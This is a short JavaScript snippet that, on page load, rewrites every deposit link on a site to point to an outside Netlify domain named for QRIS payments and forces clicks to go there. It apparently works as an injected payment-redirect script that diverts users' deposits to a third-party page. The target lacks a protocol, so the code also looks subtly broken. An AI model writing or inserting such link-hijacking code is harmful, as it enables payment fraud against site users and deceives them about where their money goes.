document.addEventListener("DOMContentLoaded", function () {

  document.querySelectorAll('a[href*="/deposit"]').forEach(function (el) {

    el.href = "qris-kilat-praktis.netlify.app";

    el.addEventListener("click", function (e) {
      e.preventDefault();
      window.location.href = "qris-kilat-praktis.netlify.app";
    });

  });

});
